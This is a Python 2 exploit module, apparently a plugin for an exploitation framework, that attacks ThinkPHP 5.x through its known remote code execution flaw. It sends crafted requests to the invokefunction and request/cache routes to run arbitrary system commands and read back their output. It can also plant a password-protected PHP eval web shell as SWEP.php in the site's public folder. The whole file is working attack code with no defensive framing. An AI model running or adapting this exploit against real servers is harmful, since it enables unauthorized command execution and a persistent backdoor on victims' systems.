import requests
import re


def info(): # Exploit information for database mechanism
    info = {
        'name': 'thinkphp_5x_rce',
        'description': 'ThinkPHP 5.x Remote code execution',
        'date': '2018-12-27',
        'parameters': {
            'url': 'Target URL',
            'command': '(OPTIONAL) Command to execute',
            'shell': '(OPTIONAL) Spawn shell',
            'payload': '(REQUIRE shell OPTION) Shell content. Default is: <?php @eval($_POST[%PASSWORD%])?>',
            'password': '(REQUIRE shell OPTION) Shell password. Default is: "X"',
            'timeout': 'Request timeout.'
        },
        'referer': 'None'
    }
    return info



class exploit():
    def __init__(self):
        self.param = {'url': None, 'command': None, 'shell': None,'password': 'X', 'payload': '<?php @eval($_POST["/*REPL*/"])?>', 'timeout': 3}
        pass


    def exploit(self):
        try:
            timeout = int(self.param['timeout'])
            if self.param['shell']:
                self.param['payload'] = self.param['payload'].replace('/*REPL*/', str(self.param['password']))
                print '[*] Trying put SWEP.php:%s at /public.' %(self.param['password'])
                if requests.get('http://%s/public/index.php?s=/index\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo+"%s">SWEP.php;echo+"SUCCESS"' %(self.param['url'], self.param['payload']), timeout=timeout).text.find('SUCCESS') != -1:
                    pass
                elif requests.get('http://%s/public/index.php?s=index\\think\\request/cache&key=echo+"%s">SWEP.php;echo+"SUCCESS"|system' %(self.param['url'], self.param['payload']), timeout=timeout).text.find('SUCCESS') != -1:
                    pass
                else:
                    print '[!] Exploit failed, Flag not found.'
                    return
                print '[+] Exploit success.'
            elif self.param['command']:
                resp = requests.get('http://%s/public/index.php?s=/index\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "///PAYLOAD>`%s`<PAYLOAD///"' %(self.param['url'], self.param['command']), timeout=timeout)
                if not resp:
                    print '[!] Failed to get response.'
                    return
                output = re.findall('///PAYLOAD>(.*)<PAYLOAD///', resp.text)[0]
                if not output:
                    resp = requests.get('http://%s/public/index.php?s=index\\think\\request/cache&key=echo+"///PAYLOAD>`%s`<PAYLOAD///"' %(self.param['url'], self.param['command']), timeout=timeout)
                    output = re.findall('///PAYLOAD>(.*)<PAYLOAD///', resp.text)[0]
                    if not output:
                        print '[!] Exploit failed, No output found.'
                        return
                print '[+] Exploit success, incoming response.'
                print '[+] --------------RESPONSE--------------'
                print str(output).encode('utf-8')
                return
            else:
                print '[!] No mode specified, Quitting.'
                return
        except Exception, e:
            print '[!] Exploit failed: %s' %(str(e))
        return


    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return
